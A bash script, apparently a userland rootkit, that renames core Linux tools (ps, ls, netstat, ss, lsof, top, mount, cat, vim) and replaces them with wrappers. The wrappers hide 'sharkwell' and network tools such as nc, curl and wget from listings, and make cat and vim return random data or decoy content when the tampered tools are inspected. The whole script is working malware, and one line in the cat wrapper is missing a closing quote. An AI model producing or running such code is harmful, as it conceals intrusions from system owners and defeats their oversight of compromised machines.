#!/bin/bash
cat_path=`which cat`
ls_path=`which ls`
lsof_path=`which lsof`
mount_path=`which mount`
netstat_path=`which netstat`
ps_path=`which ps`
ss_path=`which ss`
top_path=`which top`
vim_path=`which vim`

mv "$cat_path" /usr/bin/systemd-stop
mv "$ls_path" /usr/bin/pbmtoaw
mv "$lsof_path" /usr/bin/pbmtoget
mv "$mount_path" /usr/bin/zipfind
mv "$netstat_path" /usr/bin/ziplist
mv "$ps_path" /usr/bin/watchgnome
mv "$ss_path" /usr/bin/traceroute-list
mv "$top_path" /usr/bin/sha128sum
mv "$vim_path" /usr/bin/md6sum

newcat='
#!/bin/bash
farg=${1##*/}
if [[ -z "${farg// }" ]]; then
    /usr/bin/systemd-stop $@
    exit
fi
substr="lsofmountnetstatpssockstattopcatvim
if  [[ $substr =~ .*$farg.* ]]; then
    head -n 50 /dev/urandom /usr/bin/systemd-stop
    exit
fi
/usr/bin/systemd-stop $@
'
echo -e "$newcat" >> $cat_path
chmod +x $cat_path

newls='
#!/bin/bash
(/usr/bin/pbmtoaw $@) | grep -Ev "sharkwell"
'
echo -e "$newls" >> $ls_path
chmod +x $ls_path

newlsof='
#!/bin/bash
(/usr/bin/pbmtoget $@) | grep -Ev "(nc|netcat|ncat|curl|wget|sharkwell)"
'
echo -e "$newlsof" >> $lsof_path
chmod +x $lsof_path

newmount='
#!/bin/bash
(/usr/bin/zipfind $@) | grep -Ev "/proc"
'
echo -e "$newmount" >> $mount_path
chmod +x $mount_path

newnetstat='
#!/bin/bash
(/usr/bin/ziplist $@) | grep -Ev "(nc|netcat|ncat|curl|wget|sharkwell)"
'
echo -e "$newnetstat" >> $netstat_path
chmod +x $netstat_path

newps='
#!/bin/bash
(/usr/bin/watchgnome $@) | grep -Ev "(nc|netcat|ncat|curl|wget|sharkwell)"
'
echo -e "$newps" >> $ps_path
chmod +x $ps_path

newss='
#!/bin/bash
(/usr/bin/traceroute-list $@) | grep -Ev "(nc|netcat|ncat|curl|wget|sharkwell)"
'
echo -e "$newss" >> $ss_path
chmod +x $ss_path

newtop='
#!/bin/sh
(/usr/bin/sha128sum $@) | grep -Ev "(nc|netcat|ncat|curl|wget|sharkwell)"
'
echo -e "$newtop" >> $top_path
chmod +x $top_path

newvim='
#!/bin/bash
farg=${1##*/}
if [[ -z "${farg// }" ]]; then
    /usr/bin/md6sum $@
    exit
fi
substr="lsofmountnetstatpssockstattopcatvim"
if  [[ $substr =~ .*$farg.* ]]; then
    /usr/bin/md6sum /usr/bin/systemd-stop
    exit
fi
/usr/bin/md6sum $@
'
echo -e "$newvim" >> $vim_path
chmod +x $vim_path
